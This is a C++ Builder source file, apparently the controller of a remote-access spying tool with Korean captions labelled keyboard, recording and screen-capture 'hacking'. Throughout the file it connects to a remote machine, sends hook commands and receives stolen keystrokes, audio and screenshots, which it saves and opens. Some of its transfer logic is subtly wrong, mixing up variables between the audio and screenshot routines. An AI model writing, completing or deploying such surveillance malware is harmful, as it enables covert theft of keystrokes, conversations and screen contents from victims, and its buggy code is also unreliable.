//---------------------------------------------------------------------------

#include <vcl.h>
#pragma hdrstop

#include "Unit1.h"
#include "Unit2.h"
#include "Unit3.h"
//---------------------------------------------------------------------------
#pragma package(smart_init)
#pragma resource "*.dfm"
#pragma resource "winxp.res"
TForm1 *Form1;
int RRS,RFS,RDS;
AnsiString set_Rdata,set_Rfiledir;
int RRS2,RFS2,RDS2;
AnsiString set_Rdata2,set_Rfiledir2;
int sw,sw2=0;
//---------------------------------------------------------------------------
__fastcall TForm1::TForm1(TComponent* Owner)
    : TForm(Owner)
{
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ClientSocket1Connect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    Form2->ServerSocket1->Active = true;
    Button3->Enabled = true;
    Button4->Enabled = true;
    Button5->Enabled = true;
    Button3->Caption = "키보드해킹";
    Button4->Caption = "녹음해킹";
    Button5->Caption = "캡쳐해킹";
    Label1->Caption = "접속체크 : 성공";
    sw2=1;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ClientSocket1Error(TObject *Sender,
      TCustomWinSocket *Socket, TErrorEvent ErrorEvent, int &ErrorCode)
{
    Button3->Enabled = false;
    Button4->Enabled = false;
    Button5->Enabled = false;
    Button3->Caption = "키보드해킹";
    Button4->Caption = "녹음해킹";
    Button5->Caption = "캡쳐해킹";
    Label1->Caption = "접속체크 : 실패";
    ErrorCode = 0;
    sw2=0;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ClientSocket1Disconnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    Button3->Enabled = false;
    Button4->Enabled = false;
    Button5->Enabled = false;
    Button3->Caption = "키보드해킹";
    Button4->Caption = "녹음해킹";
    Button5->Caption = "캡쳐해킹";
    Label1->Caption = "접속체크 : 꺼짐";
    sw2=0;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button1Click(TObject *Sender)
{
    if(sw2!=1)
    {
        if(Edit1->Text.Pos(".")&&Edit2->Text != "")
        {
            ClientSocket1->Active = false;
            ClientSocket2->Active = false;
            ClientSocket1->Host = Edit1->Text;
            ClientSocket2->Host = Edit1->Text;
            ClientSocket1->Port = StrToInt(Edit2->Text);
            ClientSocket1->Active = true;
            ClientSocket2->Active = true;
        }
        else
        {
            ShowMessage("ip와 port를 정확히 써주시기 바랍니다.");
        }
        sw2=1;
    }
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button2Click(TObject *Sender)
{
    ClientSocket1->Active = false;
    ClientSocket2->Active = false;
    Form2->ServerSocket1->Active = false;
    sw2=0;
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Edit3KeyPress(TObject *Sender, char &Key)
{
    if(Key == 0xd)
    {
        ClientSocket1->Socket->SendText(Edit3->Text);
        Edit3->Text = "";
    }
}
//---------------------------------------------------------------------------
void __fastcall TForm1::ClientSocket1Read(TObject *Sender,
      TCustomWinSocket *Socket)
{
    AnsiString text = Socket->ReceiveText();
    if(text.Pos("_listup_"))
    {
        text.Delete(1,8);
        Form2->ListBox1->Items->Text = text.SubString(1,text.Pos("#")-1);
        text.Delete(1,text.Pos("#"));
        Form2->ListBox2->Items->Text = text;
    }
    else
    {
        Memo1->Lines->Add(text);
    }
}
//---------------------------------------------------------------------------
void __fastcall TForm1::Button3Click(TObject *Sender)
{
    if(Button3->Caption == "키보드해킹" && Button4->Caption!="종료" && Button5->Caption!="종료")
    {
        Button3->Caption = "중지";
        ClientSocket2->Socket->SendText("_kbhook_");
    }
    else if(Button3->Caption == "중지")
    {
        Button3->Caption = "키보드해킹";
        ClientSocket2->Socket->SendText("_kbhookoff_");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ClientSocket2Disconnect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    Form1->Width = 315;
    Form1->Height = 227;
    Button6->Enabled = false;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ClientSocket2Connect(TObject *Sender,
      TCustomWinSocket *Socket)
{
    Form1->Width = 513;
    Form1->Height = 227;
    Button6->Enabled = true;
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button6Click(TObject *Sender)
{
    if(SaveDialog1->Execute())
    {
        Memo2->Lines->SaveToFile(SaveDialog1->FileName+".txt");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ClientSocket2Error(TObject *Sender,
      TCustomWinSocket *Socket, TErrorEvent ErrorEvent, int &ErrorCode)
{
    if(ErrorCode == 10061)
    {
        ShowMessage("서버가 꺼져있습니다.");
    }
    ErrorCode = 0;
    Button2->Click();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::ClientSocket2Read(TObject *Sender,
      TCustomWinSocket *Socket)
{
    AnsiString text = Socket->ReceiveText();
    if(text.Pos("_kbhook_"))
    {
        text.Delete(1,8);
        Memo2->Lines->Add(text);
    }
    else if(text.Pos("_recordsend_"))
    {
        text.Delete(1,12);
        RRS=0;
        RFS=StrToInt(text);
        RDS=0;
        set_Rdata="";
        set_Rfiledir="C:\\temp2.wav";
        dwfs = new TFileStream(set_Rfiledir, fmCreate|fmShareCompat);
        Socket->SendText("_recordsend_0");
    }
    else if(text.Pos("_upload_"))
    {
        text.Delete(1,8);
        RDS = StrToInt(text.SubString(1,text.Pos("_")-1));
        RRS += RDS;
        text.Delete(1,text.Pos("_"));
        set_Rdata = text;
        if(RFS-RRS == 0)
        {
            dwfs->Write(set_Rdata.c_str(),set_Rdata.Length());
            delete dwfs;
            RFS = 0;
            RRS = 0;
            set_Rdata = "";
            set_Rfiledir = "";
            ShellExecute(Handle,"open","C:\\temp2.wav","","",SW_SHOWNORMAL);
        }
        else if(set_Rdata.Length() >= RDS)
        {
            dwfs->Write(set_Rdata.c_str(),set_Rdata.Length());
            Socket->SendText("_recordsend_"+IntToStr(RRS));
        }
    }
    else if(text.Pos("_picturesend_"))
    {
        text.Delete(1,13);
        RRS2=0;
        RFS2=StrToInt(text);
        RDS2=0;
        set_Rdata2="";
        set_Rfiledir2="C:\\picture2.bmp";
        DeleteFile("C:\\picture2.bmp");
        dwfs2 = new TFileStream(set_Rfiledir2, fmCreate|fmShareCompat);
        Socket->SendText("_capup_0");
    }
    else if(text.Pos("_capup_"))
    {
        text.Delete(1,7);
        RDS2 = StrToInt(text.SubString(1,text.Pos("_")-1));
        RRS2 += RDS2;
        text.Delete(1,text.Pos("_"));
        set_Rdata2 = text;
        if(RFS2-RRS2 == 0)
        {
            dwfs2->Write(set_Rdata2.c_str(),set_Rdata2.Length());
            delete dwfs2;
            RFS2 = 0;
            RRS2 = 0;
            set_Rdata2 = "";
            set_Rfiledir2 = "";
            Form3->Hide();
            Form3->Show();
            if(Button5->Caption == "종료")
            {
                ClientSocket2->Socket->SendText("_capture_");
            }
        }
        else if(set_Rdata.Length() >= RDS)
        {
            dwfs2->Write(set_Rdata2.c_str(),set_Rdata2.Length());
            Socket->SendText("_capup_"+IntToStr(RRS2));
        }
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::Button4Click(TObject *Sender)
{
    if(Button4->Caption == "녹음해킹" && Button5->Caption!="종료" && Button3->Caption!="종료")
    {
        Button4->Caption = "종료";
        AnsiString recording;
        record = new TFileStream("C:\\BUS\\해킹\\temp.wav", fmOpenRead|fmShareCompat);
        recording.SetLength(record->Size);
        record->Read(recording.c_str(),record->Size);
        ClientSocket2->Socket->SendText("_recordhook_"+recording);
        delete record;
    }
    else if(Button4->Caption == "종료")
    {
        Button4->Caption = "녹음해킹";
        ClientSocket2->Socket->SendText("_recordhookoff_");
    }
}
//---------------------------------------------------------------------------


void __fastcall TForm1::Button5Click(TObject *Sender)
{
    if(Button5->Caption == "캡쳐해킹" && Button3->Caption!="종료" && Button4->Caption!="종류")
    {
        Button5->Caption = "종료";
        Form3->Button1->Caption = "중지 후 종료";
        ClientSocket2->Socket->SendText("_capture_");
    }
    else if(Button5->Caption == "종료")
    {
        Button5->Caption = "캡쳐해킹";
        Form3->Button1->Caption = "캡쳐해킹";
        ClientSocket2->Socket->SendText("_captureoff_");
    }
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormClose(TObject *Sender, TCloseAction &Action)
{
    Form2->Close();
    Form3->Close();
}
//---------------------------------------------------------------------------

void __fastcall TForm1::FormShow(TObject *Sender)
{
    if(sw!=1)
    {
        Memo1->Lines->LoadFromFile("해킹\\ip.txt");
        Edit1->Text = Memo1->Lines->Strings[0];
        Edit2->Text = Memo1->Lines->Strings[1];
        Memo1->Lines->Clear();
        sw=1;
    }
}
//---------------------------------------------------------------------------

